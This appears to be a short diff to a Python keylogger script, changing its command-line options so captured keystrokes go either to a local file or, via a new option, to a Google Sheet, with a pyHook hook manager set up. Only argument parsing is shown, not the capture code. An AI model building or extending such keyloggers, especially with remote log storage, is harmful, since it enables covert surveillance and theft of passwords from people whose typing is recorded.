@@ -135,7 +135,8 @@ class Keylogger():
 if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(description="Keylogger")
-    parser.add_argument('-l', default='local', help='How to store logs [local|gdrive]')
+    parser.add_argument('-l', default='keylogs.txt', help='File to store logs')
+    parser.add_argument('-k', default='', help='Store to google sheet, key referencing the sheet')
     args = parser.parse_args()
 
     obj = pyHook.HookManager()
